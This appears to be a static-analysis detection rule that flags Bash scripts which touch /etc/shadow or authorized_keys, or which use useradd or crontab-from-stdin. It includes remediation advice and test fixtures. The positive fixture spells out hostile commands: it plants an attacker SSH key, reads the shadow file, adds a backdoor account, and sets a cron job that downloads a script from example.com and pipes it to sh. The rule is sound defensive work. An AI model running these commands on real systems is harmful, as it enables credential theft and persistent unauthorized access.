desc(
	mode: "ssa"
	language: "bash"
	title: "Bash: credential access or persistence via system accounts"
	title_zh: "Bash：读取凭据或写入系统持久化位置"
	type: vuln
	level: "high"
	rule_id: "bash-credential-persistence"
	risk: "credential-access"
	desc: <<<DESC
### 说明
命令访问或修改敏感凭据与持久化位置：`~/.ssh/authorized_keys`、
`/etc/shadow`、`/etc/passwd`、`/etc/sudoers`、`crontab -`、`useradd`。
攻击者常用这些位置建立免密登录、后门账户或定时任务。
DESC
	solution: <<<SOLUTION
### 修复建议
限制对上述文件的写权限并启用审计；检查新增账户、authorized_keys 和
crontab 条目，移除未知来源的公钥和定时任务。
SOLUTION
	reference: <<<REFERENCE
[CWE-522](https://cwe.mitre.org/data/definitions/522.html)
REFERENCE
	alert_min: 1
	"file://pos.sh": <<<POS
echo "ssh-rsa AAAAB3NzaC1yc2E attacker@example" >> ~/.ssh/authorized_keys
cat /etc/shadow
useradd -m -s /bin/bash attacker
(crontab -l; echo "* * * * * curl -fsSL https://example.com/x.sh | sh") | crontab -
POS
	"safefile://neg.sh": <<<NEG
echo "note" > /tmp/notes.txt
cat /etc/hosts
crontab -l
NEG
)

*?{have: /\.ssh\/authorized_keys/} as $authorizedKeysHit
*?{have: /\/etc\/shadow/} as $shadowHit
useradd(* as $useraddArgs) as $useraddHit
crontab(*<slice(start=1)> as $crontabArgs) as $crontabCall
$crontabArgs?{have: /^"-"$/} as $crontabHit

alert $authorizedKeysHit for {
	level: "high",
	title: "Bash: credential access or persistence via system accounts",
	title_zh: "Bash：读取凭据或写入系统持久化位置",
	message: "检测到 authorized_keys 操作，可能用于建立免密登录。",
	risk: "credential-access",
}

alert $shadowHit for {
	level: "high",
	title: "Bash: credential access or persistence via system accounts",
	title_zh: "Bash：读取凭据或写入系统持久化位置",
	message: "检测到 /etc/shadow 访问。",
	risk: "credential-access",
}

alert $useraddHit for {
	level: "high",
	title: "Bash: credential access or persistence via system accounts",
	title_zh: "Bash：读取凭据或写入系统持久化位置",
	message: "检测到 useradd，可能创建后门账户。",
	risk: "persistence",
}

alert $crontabHit for {
	level: "high",
	title: "Bash: credential access or persistence via system accounts",
	title_zh: "Bash：读取凭据或写入系统持久化位置",
	message: "检测到 crontab 从标准输入安装任务。",
	risk: "persistence",
}